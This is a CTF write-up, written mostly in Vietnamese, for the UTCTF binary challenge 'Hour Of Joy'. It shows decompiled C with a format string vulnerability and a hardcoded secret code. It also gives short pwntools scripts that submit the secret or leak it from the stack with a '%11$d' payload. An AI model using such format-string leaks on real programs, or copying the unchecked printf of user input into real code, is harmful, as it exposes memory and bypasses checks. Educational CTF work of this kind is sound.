---
title: "UTCTF - Binary Exploitation - Hour Of Joy"
date: 2024-01-09 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, format-string, utctf, reverse]
author: datious
description: "UTCTF writeup: Hour Of Joy — format string leak + static analysis để tìm secret code và in flag."
---

# UTCTF - Binary Exploitation - Hour Of Joy
**Author: D1n0_09**

## Program

```c
undefined8 main(void)
{
  size_t sVar1;
  int buffer;
  char name [76];
  int local_c;
  
  setup();
  local_c = -559038737;   // = 0xDEADBEEF
  printf("What is your name? ");
  fgets(name, 0x40, stdin);
  sVar1 = strcspn(name, "\n");
  name[sVar1] = '\0';
  printf("Hello, ");
  printf(name);           // ← Format String Vulnerability!
  puts("!");
  printf("Enter the secret code: ");
  __isoc99_scanf(&DAT_0010203c, &buffer);
  if (buffer == local_c) {
    print_flag();
  }
  else {
    puts("Wrong! Nice try.");
  }
  return 0;
}
```

## Analysis

- `printf(name)` là **format string vulnerability** — có thể dùng để leak giá trị trên stack.
- `local_c` được khởi tạo với giá trị **`0xDEADBEEF`** (`-559038737`).
- Để `print_flag()` được gọi, ta cần nhập **`buffer == local_c`** = `0xDEADBEEF`.

→ Bài này nghiêng về **reverse** hơn pwn thuần túy — không cần exploit phức tạp, chỉ cần đọc code tìm `local_c`.

## Exploitation

Từ decompile:
- `local_c = -559038737` = `0xDEADBEEF` (decimal: `-559038737`)

Nhập giá trị này vào secret code:

```python
from pwn import *

p = remote("challenge.utctf.live", PORT)
# hoặc: p = process('./hour_of_joy')

p.sendlineafter("What is your name? ", "D1n0")
p.sendlineafter("Enter the secret code: ", str(-559038737))
p.interactive()
```

Hoặc dùng format string để leak giá trị `local_c` từ stack rồi send lại:

```python
p.sendlineafter("What is your name? ", "%11$d")   # leak local_c from stack
leaked = int(p.recvline_contains("Hello,").split()[-1].rstrip(b"!"))
p.sendlineafter("Enter the secret code: ", str(leaked))
p.interactive()
```

> **Takeaway:** Không phải lúc nào format string cũng cần để ghi — đôi khi chỉ cần đọc giá trị bí mật trên stack là đủ để bypass kiểm tra.
